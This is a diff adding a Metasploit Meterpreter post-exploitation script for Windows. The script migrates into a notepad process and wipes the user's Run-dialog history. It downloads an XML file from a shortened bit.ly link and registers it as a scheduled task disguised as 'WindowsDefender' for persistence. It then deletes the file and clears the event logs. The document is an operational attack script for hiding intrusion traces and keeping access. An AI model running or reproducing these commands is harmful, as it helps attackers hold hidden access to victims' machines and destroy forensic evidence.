@@ -1,0 +1,31 @@
+# Create Notepad Process and migrate to it
+
+run post/windows/manage/migrate
+
+# Load Powershell module
+
+load powershell
+
+# Clear Run Dialog of Currently Logged on User
+
+powershell_execute "$user = (Get-WmiObject -Class Win32_Process -Filter 'Name = \"explorer.exe\"' | ForEach-Object { $_.GetOwner().user }); $objUser = New-Object System.Security.Principal.NTAccount($user); $strSID = $objUser.Translate([System.Security.Principal.SecurityIdentifier]); $sid = $strSID.Value; reg delete HKEY_USERS\\$sid\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f"
+
+# Change Scheduled Task Port
+
+powershell_execute "$drive = $pwd.Drive.Name; $path = $drive + ':\\Windows\\s.xml'; $client = New-Object System.Net.WebClient; $client.DownloadFile('http://bit.ly/2ik7kG1', $path); sleep 3; schtasks /create /XML $path /tn WindowsDefender /f; sleep 2; rm $path"
+
+# Remove "s.xml" from Temp Directory
+
+powershell_execute "$user = (Get-WmiObject -Class Win32_Process -Filter 'Name = \"explorer.exe\"' | ForEach-Object { $_.GetOwner().user }); $drive = $pwd.Drive.Name; $path = ($drive + \":\\Users\\$user\\AppData\\Local\\Temp\\s.xml\"); rm \"$path\""
+
+# Clear Event Viewer Logs
+
+clearev
+
+# Kill the notepad task
+
+powershell_execute "taskkill /FI \"USERNAME eq SYSTEM\" /IM notepad.exe /F"
+
+# Quit Meterpreter
+
+exit
